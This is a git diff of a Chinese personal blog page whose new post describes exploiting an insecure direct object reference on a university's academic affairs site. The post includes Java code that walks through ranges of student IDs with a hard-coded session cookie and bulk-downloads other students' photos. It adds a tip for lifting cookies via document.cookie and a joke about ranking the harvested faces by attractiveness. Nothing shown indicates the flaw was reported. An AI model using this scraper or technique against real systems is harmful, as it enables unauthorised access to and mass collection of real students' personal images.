@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="utf-8">
-  <title>导论 | 桥桥的代码小屋</title>
-  <meta name="keywords" content=" 导论 ">
-  <meta name="description" content="导论 | 桥桥的代码小屋">
+  <title>学校教务网的一个安全漏洞 | 桥桥的代码小屋</title>
+  <meta name="keywords" content=" 简易爬虫 , 漏洞 ">
+  <meta name="description" content="学校教务网的一个安全漏洞 | 桥桥的代码小屋">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="个人简介  &amp;emsp;&amp;emsp;大学生一枚，专业软件工程，对于热衷学习计算机知识，渴望能接触一流的软件开发流程和一线的技术。    联系方式 QQ: 1060172264 e-mail: DAmarkday@163.com  致谢&amp;emsp;&amp;emsp;非常感谢 叶落阁 大佬的主题和说明，让我能很大程序理解博客的构造和搭建。">
 <meta property="og:type" content="website">
@@ -303,9 +303,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-导论" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-find-leak" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">导论</h1>
+        <h1 class="article-title">学校教务网的一个安全漏洞</h1>
     
     <div class="article-meta">
         
@@ -313,26 +313,28 @@
         
         <span class="book">
             
-                <a href="javascript:" data-rel="导论">导论</a>
+                <a href="javascript:" data-rel="安全漏洞">安全漏洞</a>
             
         </span>
         
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">导论</a>
+            <a href="javascript:" class="color5">简易爬虫</a>
+            
+            <a href="javascript:" class="color3">漏洞</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2019-07-31 11:59:58'>2019-07-30 20:44</time>
+        创建时间:<time class="date" title='更新时间: 2019-08-05 13:19:07'>2019-08-05 10:42</time>
         
     </div>
     <div class="article-meta">
         
-        <span>字数:622</span>
+        <span>字数:1k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -362,7 +364,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#why-blog"><span class="toc-text">why blog</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#目的"><span class="toc-text">目的</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#学习困境"><span class="toc-text">学习困境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#继续深入"><span class="toc-text">继续深入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#目标"><span class="toc-text">目标</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#发现教务网的一个安全漏洞"><span class="toc-text">发现教务网的一个安全漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#http的get请求和post请求的区别"><span class="toc-text">http的get请求和post请求的区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#探究过程"><span class="toc-text">探究过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#成果"><span class="toc-text">成果</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#注意"><span class="toc-text">注意</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#最后"><span class="toc-text">最后</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -377,32 +379,41 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="why-blog"><a href="#why-blog" class="headerlink" title="why blog"></a>why blog</h1><blockquote>
-<p>&emsp;&emsp;长久以来一个问题一直困扰着我，为什么有些东西如此昂贵，如此的高科技，却毫无用处，就像我知道的，计算机虽然是台笨机器，却有能力做出难以置信的智能事情，而程序员虽然是一些聪明的人，但却老是做难以置信的傻事情。他们呀，简言之，是对绝配。</p>
-<p>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;— Bill Bryson, 作家, 出自《Notes from a Big Country》</p>
+        <h1 id="发现教务网的一个安全漏洞"><a href="#发现教务网的一个安全漏洞" class="headerlink" title="发现教务网的一个安全漏洞"></a>发现教务网的一个安全漏洞</h1><blockquote>
+<p>&emsp;&emsp;在做一个人脸识别的项目时，需要获取学校教务网上的学生的照片，但是后来我无意中发现学校教务网上的一个安全漏洞，就是在得到自己图片的cookie之后，由于学校的http请求是get请求，并且由于cookie的权限会导致你在持有cookie的情况下可以访问学校任何一个有学号的同学的照片</p>
 </blockquote>
-<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>&emsp;&emsp;针对网络上繁杂的基础知识和实验流程做一个自己总结的简略总结，每个人的思维方式和问题角度，对待问题的着重点不同以至于在网络上看待一个过程，知识点，问题的解决方案每个人所得到的东西都不尽一致。希望自己能尽心尽力地去总结我在学习上遇到的各种困难问题，这样对自己后来的复习和解决新的困难时会更加迅速。</p>
+<br>
 
-<h2 id="学习困境"><a href="#学习困境" class="headerlink" title="学习困境"></a>学习困境</h2><p>&emsp;&emsp;需要学习的东西太多，完整消化一个知识点又需要很长时间，比如对于http协议的深入了解还需要去了解交换机局域网的通信原理，在学习过程种所遇到的困难很多，网络上有些存在解决方案但是没有讲授出现问题的原因。况且身边的学习氛围不够浓厚，除非意志坚定很难在一段漫长的时间里保持对学习的高度热情，并且身处群体之中，个体很难维持长久的理智。希望自己能在学习的道路上顽强走下去。</p>
+<h2 id="http的get请求和post请求的区别"><a href="#http的get请求和post请求的区别" class="headerlink" title="http的get请求和post请求的区别"></a>http的get请求和post请求的区别</h2><p>&emsp;&emsp;关于这一点,直接把百度的结果粘贴如下:</p>
 
-<h2 id="继续深入"><a href="#继续深入" class="headerlink" title="继续深入"></a>继续深入</h2><ul>
-<li>wireshark的使用</li>
-<li>完整探究局域网的底层通讯原理</li>
-<li>学习二维码的原理</li>
-<li>框架架构设计模式的根本区别</li>
-<li>了解数据保护</li>
-<li>深入探究web开发流程客户端服务端数据库的三方通讯</li>
-<li>巩固代码基础（java implements）</li>
-<li>修改校园失物巡回箱子的刷新监听代码</li>
-<li>修改校园失物巡回箱子人脸动态活体扫描机制</li>
-<li>抓取学校官网的照片并进行人脸对比</li>
-<li>了解dns劫持</li>
-<li>写http图解的读后感，梳理其中的web攻击方式（博客）</li>
-<li>熟悉安卓的mvp和mvc设计模式</li>
-<li>了解脚本</li>
-</ul>
-<h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><p>好好学习</p>
+<p>&emsp;&emsp;<strong> GET和POST是Http请求中最常用的两种请求方法: </strong></p>
+<blockquote>
+<p>   首先介绍GET与POST的差异:</p>
+<p>   （1）GET请求资源数据，POST向服务器传递需要处理的数据</p>
+<p>  （2）GET传递数据大小不超过2kb，POST没有限制</p>
+<p>  （3）GET请求的参数会在Url上暴露显示，POST请求参数在Requestbody里，所以相对GET来说，POST安全性较高</p>
+<p>  （4）GET 请求的静态资源会被浏览器缓存，POST不会被缓存</p>
+<p>   （5）GET传递的数据类型是文本，POST是文本或者二进制</p>
+<p>   （6）GET请求被回退时是无害的，POST请求被回退是会被重新再执行一次GET和POST的使用场景：  </p>
+<blockquote>
+<p>   （a）在传递一些机密信息时必须要使用POST<br>   （b）只是查询获取数据时可以用GET<br>   （c）POST请求速率会比GET慢，因为GET请求产生一个TCP数据包;POST请求产生两个TCP数据包</p>
+</blockquote>
+</blockquote>
+<hr>
+<br>
 
+<h2 id="探究过程"><a href="#探究过程" class="headerlink" title="探究过程"></a>探究过程</h2>   <p>&emsp;&emsp;由于get请求的参数会在url暴露显示，我们可以直接更改url上的参数，将学号更改为其他人的学号来获取其他人的照片信息,但是发现这样获取太慢了，就直接写个多线程批量下载照片</p>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">import java.io.BufferedInputStream;</span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.File;</span><br><span class="line">import java.io.FileOutputStream;  </span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.net.HttpURLConnection;  </span><br><span class="line">import java.net.URL;  </span><br><span class="line">  </span><br><span class="line"> public class downimage &#123;  </span><br><span class="line">	  public static void  downLoadFromUrl(String urlStr,String fileName,String savePath) throws IOException&#123;</span><br><span class="line">	        URL url = new URL(urlStr);  </span><br><span class="line">	        HttpURLConnection conn = (HttpURLConnection)url.openConnection();  </span><br><span class="line">	        conn.setConnectTimeout(3*1000); </span><br><span class="line">	        System.setProperty(&quot;http.proxyHost&quot;, &quot;localhost&quot;); </span><br><span class="line">	        System.setProperty(&quot;http.proxyPort&quot;, &quot;8888&quot;);         </span><br><span class="line">	        conn.setRequestProperty(&quot;User-Agent&quot;, &quot;Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt)&quot;);</span><br><span class="line">            conn.setRequestProperty(&quot;Cookie&quot;,&quot;semester.id=281; JSESSIONID=8F14338919CEA1334F7E4B558217782D; iPlanetDirectoryPro=vYeKkeVYfd97aWCGmR2lSA&quot;);</span><br><span class="line">	        InputStream inputStream = conn.getInputStream();  </span><br><span class="line">	        byte[] getData = readInputStream(inputStream);    </span><br><span class="line">	        File saveDir = new File(savePath);</span><br><span class="line">	        if(!saveDir.exists())&#123;</span><br><span class="line">	            saveDir.mkdir();</span><br><span class="line">	        &#125;</span><br><span class="line">	        File file = new File(saveDir+File.separator+fileName);    </span><br><span class="line">	        FileOutputStream fos = new FileOutputStream(file);     </span><br><span class="line">	        fos.write(getData); </span><br><span class="line">	        if(fos!=null)&#123;</span><br><span class="line">	            fos.close();  </span><br><span class="line">	        &#125;</span><br><span class="line">	        if(inputStream!=null)&#123;</span><br><span class="line">	            inputStream.close();</span><br><span class="line">	        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	        System.out.println(&quot;info:&quot;+url+&quot; download success&quot;); </span><br><span class="line"></span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	    public static  byte[] readInputStream(InputStream inputStream) throws IOException &#123;  </span><br><span class="line">	        byte[] buffer = new byte[1024];  </span><br><span class="line">	        int len = 0;  </span><br><span class="line">	        ByteArrayOutputStream bos = new ByteArrayOutputStream();  </span><br><span class="line">	        while((len = inputStream.read(buffer)) != -1) &#123;  </span><br><span class="line">	            bos.write(buffer, 0, len);  </span><br><span class="line">	        &#125;  </span><br><span class="line">	        bos.close();  </span><br><span class="line">	        return bos.toByteArray();  </span><br><span class="line">	    &#125;  </span><br><span class="line"></span><br><span class="line">	    public static void main(String[] args) throws InterruptedException &#123;</span><br><span class="line">	    	int z=起始学号;</span><br><span class="line">	    	int y = 结束学号;</span><br><span class="line">	    	for (int i=起始学号;i&lt;=v结束学号;i++)&#123;</span><br><span class="line">	    	  	String filename=y+&quot;.jpg&quot;;</span><br><span class="line">	    		String x=&quot;网址&quot;+z;//z是学号，由于是get请求</span><br><span class="line">	    		new Thread(new Runnable()&#123;</span><br><span class="line"></span><br><span class="line">					@Override</span><br><span class="line">					public void run() &#123;</span><br><span class="line">						// TODO Auto-generated method stub</span><br><span class="line">						 try&#123;</span><br><span class="line">					            downLoadFromUrl(x,</span><br><span class="line">					                    filename,&quot;C:/Users/asus/Desktop/pictures&quot;);</span><br><span class="line">					            </span><br><span class="line">					        &#125;catch (Exception e) &#123;</span><br><span class="line">					            // TODO: handle exception</span><br><span class="line">					        &#125;</span><br><span class="line">					&#125;</span><br><span class="line">	    			</span><br><span class="line">	    		&#125;).start();</span><br><span class="line">	    		Thread.sleep(2000);</span><br><span class="line">	    		z++;</span><br><span class="line">	    		y++;</span><br><span class="line">	    		</span><br><span class="line">	    	&#125;</span><br><span class="line">	    	</span><br><span class="line">	    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;线程休眠2s,之后直接将图片下载到桌面上的文件夹中，理论上你可以下载所有学生的照片，<del>如果外带一个人脸识别接口判断颜值，就能找到校花了</del> </p>
+<h2 id="成果"><a href="#成果" class="headerlink" title="成果"></a>成果</h2><p>抓取成果:</p>
+<p><img src="/2019/08/05/find-leak/find-leak.png" alt="成果截图"><br>           &nbsp; &nbsp; &nbsp; ps：为保护隐私，给图片打码。</p>
+<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>&emsp;&emsp;源代码中cookie是需要你手动获取的，在浏览器中打开图片前f12打开浏览器开发者模式,找到含有sessionid的cookie手动填上去。如果觉得麻烦，这里提供一个思路：
+先用账号密码登录官网，然后用document.cookie获取到cookie，然后包装请求头再次发送给服务器，前提是该cookie没有设置httponly。</p>
+
+
+<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2> <p>&emsp;&emsp;本篇博客原创仅供学习交流使用，如用作其他用途所承受的法律责任一概与作者无关。</p>
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 DAmarkday@163.com </span>
     </div>
@@ -415,12 +426,12 @@
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>导论</p>
-    <p><span class="copy-title">文章字数:</span><span class="post-count">622</span></p>
+    <p><span class="copy-title">文章标题:</span>学校教务网的一个安全漏洞</p>
+    <p><span class="copy-title">文章字数:</span><span class="post-count">1k</span></p>
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="DAmarkday">DAmarkday</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-07-30, 20:44:01</p>
-    <p><span class="copy-title">最后更新:</span>2019-07-31, 11:59:58</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/07/30/导论/" title="导论">http://DAmarkday.com/2019/07/30/导论/</a>
+    <p><span class="copy-title">发布时间:</span>2019-08-05, 10:42:33</p>
+    <p><span class="copy-title">最后更新:</span>2019-08-05, 13:19:07</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/08/05/find-leak/" title="学校教务网的一个安全漏洞">http://DAmarkday.com/2019/08/05/find-leak/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
